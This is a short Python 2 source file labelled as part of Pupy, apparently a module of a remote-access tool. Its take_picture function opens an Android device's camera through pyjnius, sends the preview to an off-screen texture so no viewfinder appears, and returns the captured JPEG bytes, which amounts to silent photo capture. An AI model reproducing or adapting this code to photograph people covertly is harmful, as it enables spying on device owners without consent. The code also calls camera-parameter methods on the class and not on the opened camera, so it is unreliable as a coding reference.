#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import jnius
from jnius import autoclass, PythonJavaClass, java_method
import time
from threading import Event

__all__=["take_picture"]

class PictureCallback(PythonJavaClass):
    __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
    def __init__(self, event):
        PythonJavaClass.__init__(self)
        self.result=None
        self.event=event
    @java_method("([BLandroid/hardware/Camera;)V")
    def onPictureTaken(self, data, camera):
        self.result=data.tostring()
        self.event.set()

def numberOfCameras():
    try:
        Camera=autoclass("android.hardware.Camera")
        return Camera.getNumberOfCameras()
    except Exception,e:
        return "?"
    
#ref: http://developer.android.com/reference/android/hardware/Camera.html
def take_picture(cam_id=0, jpegQuality=90):
    Camera=autoclass("android.hardware.Camera")
    c = Camera.open(cam_id)
    try:
        params = Camera.getParameters();
        params.setJpegQuality(jpegQuality);
        Camera.setParameters(params);
        SurfaceTexture=autoclass("android.graphics.SurfaceTexture")
        c.setPreviewTexture(SurfaceTexture(0))
        c.startPreview()
        #view = SurfaceView(0);
        #c.setPreviewDisplay(view.getHolder());
        e=Event()
        pc=PictureCallback(e)
        c.takePicture(None, None, pc)
        e.wait()
        return pc.result
    finally:
        c.release()
        del e
        del pc
        del c

